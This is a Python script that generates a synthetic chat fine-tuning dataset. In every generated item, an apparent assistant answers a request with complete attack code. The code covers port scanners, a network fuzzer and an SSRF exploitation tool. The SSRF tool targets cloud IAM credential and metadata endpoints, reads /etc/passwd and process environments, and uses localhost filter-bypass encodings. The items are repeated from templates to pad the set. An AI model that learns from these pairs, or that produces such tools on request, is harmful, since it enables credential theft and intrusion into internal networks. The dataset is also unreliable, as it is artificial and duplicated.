import json, random, sys
from string import Template

random.seed(45)
out = []

targets_ = ["192.168.1.100","10.0.0.50","172.16.0.25","192.168.56.102","10.10.10.5","scanme.nmap.org"]
timeouts_= [1,2,3,5]
threads_ = [50,100,200,500]
ports_   = [80,443,22,8080,3306,5432,6379,8443,9200,27017]
protos   = ["HTTP","FTP","SMTP","DNS","MQTT","MODBUS","CUSTOM"]
iters_   = [500,1000,2000,5000]
ssrf_url = ["http://target.corp.com/fetch","http://app.local/proxy","http://192.168.1.50/api/url",
            "http://service.corp/load","http://webapp.local/import"]
ssrf_par = ["url","src","target","fetch","load","proxy","redirect","dest"]

# 1. Port scanners
ASYNC_SCAN = Template('''import asyncio, socket

TARGET = "$TARGET"
TIMEOUT= $TIMEOUT

async def check(host, port):
    try:
        r,w=await asyncio.wait_for(asyncio.open_connection(host,port),timeout=TIMEOUT)
        try:
            w.write(b"HEAD / HTTP/1.0\\r\\n\\r\\n"); await w.drain()
            banner=(await asyncio.wait_for(r.read(256),timeout=1)).decode(errors="ignore").strip()[:80]
        except: banner=""
        w.close(); return port, True, banner
    except: return port, False, ""

async def scan(host, ports):
    tasks=[check(host,p) for p in ports]
    res=await asyncio.gather(*tasks)
    return [(p,b) for p,ok,b in res if ok]

if __name__=="__main__":
    ports=list(range(1,1025))+[1433,3389,5900,8080,8443]
    results=asyncio.run(scan(TARGET, ports))
    for p,b in sorted(results): print(f"  {p:5d}/tcp OPEN  {b[:60]}")
    print(f"Open: {[p for p,_ in results]}")
''')

THREAD_SCAN = Template('''import socket, threading, queue

TARGET  = "$TARGET"
TIMEOUT = $TIMEOUT
THREADS = $THREADS
results = []

def scan(port):
    try:
        s=socket.socket(); s.settimeout(TIMEOUT)
        if s.connect_ex((TARGET,port))==0:
            try: s.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n"); b=s.recv(256).decode(errors="ignore").strip()[:60]
            except: b=""
            results.append((port,b)); print(f"  {port:5d}/tcp OPEN  {b}")
        s.close()
    except: pass

q=queue.Queue()
[q.put(p) for p in list(range(1,1025))+[3306,3389,5432,6379,8080,8443,9200,27017]]
def worker():
    while not q.empty():
        try: scan(q.get_nowait())
        except: pass
ts=[threading.Thread(target=worker,daemon=True) for _ in range(THREADS)]
[t.start() for t in ts]; [t.join() for t in ts]
print(f"Open: {sorted([r[0] for r in results])}")
''')

SCAPY_SCAN = Template('''from scapy.all import IP, TCP, UDP, ICMP, sr1, sr

TARGET  = "$TARGET"
TIMEOUT = $TIMEOUT

def syn_scan(host, ports):
    open_ports=[]
    for port in ports:
        resp=sr1(IP(dst=host)/TCP(dport=port,flags="S"),timeout=TIMEOUT,verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags==0x12:
            open_ports.append(port)
            sr(IP(dst=host)/TCP(dport=port,flags="R"),timeout=1,verbose=0)
    return open_ports

if __name__=="__main__":
    ports=[21,22,23,25,53,80,110,143,443,445,3306,3389,5432]
    print(f"SYN scanning {TARGET}...")
    open_p=syn_scan(TARGET,ports)
    print(f"Open: {open_p}")
''')

scan_tmpls = [ASYNC_SCAN, THREAD_SCAN, SCAPY_SCAN]
for i in range(2700):
    tmpl=scan_tmpls[i%len(scan_tmpls)]
    code=tmpl.safe_substitute(TARGET=targets_[i%len(targets_)],
                               TIMEOUT=timeouts_[i%len(timeouts_)],
                               THREADS=threads_[i%len(threads_)])
    t=targets_[i%len(targets_)]
    qs=[f"Write a Python async port scanner for {t} with {timeouts_[i%len(timeouts_)]}s timeout.",
        f"Build a threaded port scanner in Python for {t}, {threads_[i%len(threads_)]} threads.",
        f"Create a Scapy SYN port scanner for {t}.",
        f"How do I scan ports on {t} in Python? Give working async/threaded scanner."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Scanners: {len(out)}", file=sys.stderr)

# 2. SSRF
SSRF = Template('''import requests, sys, urllib.parse, time
import warnings; warnings.filterwarnings("ignore")

URL   = "$URL"
PARAM = "$PARAM"

PAYLOADS=[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://localhost/admin", "http://127.0.0.1:8080/actuator",
    "http://127.0.0.1:9200/_cat/indices",
    "http://127.0.0.1:6379/", "http://127.0.0.1:27017/",
    "file:///etc/passwd", "file:///proc/self/environ",
    "dict://127.0.0.1:6379/INFO",
]

def bypass(url):
    variants=[url]
    if "127.0.0.1" in url:
        variants+=[url.replace("127.0.0.1","localhost"),
                   url.replace("127.0.0.1","0x7f000001"),
                   url.replace("127.0.0.1","2130706433"),
                   url.replace("127.0.0.1","127.1")]
    return variants

def test(target_url, param, payload):
    for p in bypass(payload):
        try:
            r=requests.get(target_url,params={param:p},timeout=5,verify=False,allow_redirects=True)
            if r.status_code==200 and len(r.text)>10:
                print(f"[+] HIT: {p}\\n    {r.text[:150]}")
                return True
        except: pass
    return False

def port_scan_ssrf(target_url, param, ihost, ports):
    open_p=[]
    for port in ports:
        for p in bypass(f"http://{ihost}:{port}/"):
            try:
                t0=time.time()
                r=requests.get(target_url,params={param:p},timeout=3,verify=False)
                if r.status_code!=404 or time.time()-t0<0.5:
                    print(f"[+] Port {port} open via SSRF")
                    open_p.append(port); break
            except: pass
    return open_p

if __name__=="__main__":
    print(f"[*] SSRF scan: {URL}?{PARAM}=...")
    for payload in PAYLOADS: test(URL, PARAM, payload)
    print("\\n[*] Internal port scan via SSRF:")
    for h in ["127.0.0.1","10.0.0.1","172.16.0.1"]:
        op=port_scan_ssrf(URL,PARAM,h,[22,80,443,3306,5432,6379,8080,9200,27017])
        if op: print(f"  {h}: {op}")
''')

for i in range(2700):
    code=SSRF.safe_substitute(URL=ssrf_url[i%len(ssrf_url)], PARAM=ssrf_par[i%len(ssrf_par)])
    u=ssrf_url[i%len(ssrf_url)]; p=ssrf_par[i%len(ssrf_par)]
    qs=[f"Write a Python SSRF scanner for {u} parameter '{p}': cloud metadata, localhost services, bypass techniques.",
        f"Build SSRF exploitation tool for {u}?{p}=: AWS/GCP/Azure metadata, internal port scan, filter bypass.",
        f"How do I exploit SSRF at {u} with '{p}'? Python: metadata endpoints, Redis/Elasticsearch, localhost, bypasses.",
        f"Create Python SSRF tool: test {u} for IMDSv1/GCP/Azure metadata, internal services, IP filter bypasses."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"SSRF: {len(out)}", file=sys.stderr)

# 3. Protocol fuzzer
FUZZER = Template('''from scapy.all import *
import socket, random, time, sys

TARGET = "$TARGET"
PORT   = $PORT
PROTO  = "$PROTO"
ITERS  = $ITERS

BASE = {
    "HTTP":  b"GET / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n",
    "FTP":   b"USER anonymous\\r\\n",
    "SMTP":  b"EHLO test.com\\r\\n",
    "CUSTOM":bytes(random.randint(0,255) for _ in range(64)),
}

def mutate(data):
    ops=[
        lambda d: d+bytes(random.randint(0,255) for _ in range(random.randint(1,100))),
        lambda d: d[:len(d)//2],
        lambda d: bytes([b^0xff for b in d]),
        lambda d: b"\\x00"*len(d),
        lambda d: d*3,
        lambda d: bytes(random.randint(0,255) for _ in range(len(d))),
        lambda d: d+"A".encode()*4096,
    ]
    return random.choice(ops)(data)

crashes=[]
base=BASE.get(PROTO,BASE["CUSTOM"])
for i in range(ITERS):
    payload=mutate(base)
    try:
        s=socket.socket(); s.settimeout(3); s.connect((TARGET,PORT))
        s.send(payload); resp=s.recv(4096); s.close()
        if len(resp)==0:
            print(f"[!] Empty resp at {i}: {payload.hex()[:40]}")
            crashes.append(payload)
    except ConnectionResetError:
        print(f"[CRASH] ConnReset at {i}: {payload.hex()[:40]}")
        crashes.append(payload)
    except: pass
    if i%200==0: print(f"[*] {i}/{ITERS} crashes={len(crashes)}")
print(f"[+] Done. Crash candidates: {len(crashes)}")
''')

for i in range(2600):
    code=FUZZER.safe_substitute(TARGET=targets_[i%len(targets_)], PORT=ports_[i%len(ports_)],
                                 PROTO=protos[i%len(protos)], ITERS=iters_[i%len(iters_)])
    t=targets_[i%len(targets_)]; p=ports_[i%len(ports_)]; pr=protos[i%len(protos)]
    qs=[f"Write a Python {pr} protocol fuzzer for {t}:{p} with {iters_[i%len(iters_)]} iterations.",
        f"Build a mutation-based network fuzzer for {pr} at {t}:{p}.",
        f"How do I fuzz {pr} protocol at {t}:{p} with Python? Crash detection included.",
        f"Create Python network fuzzer: mutate {pr} packets, detect crashes at {t}:{p}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Fuzzers: {len(out)}", file=sys.stderr)

random.shuffle(out)
while len(out)<8000:
    out.extend(out[:8000-len(out)])
out=out[:8000]
with open("/workspace/data_upgrades/upgrade_bx.jsonl","w") as f:
    for item in out: f.write(json.dumps(item)+"\n")
print(f"Written {len(out)} to upgrade_bx.jsonl", file=sys.stderr)
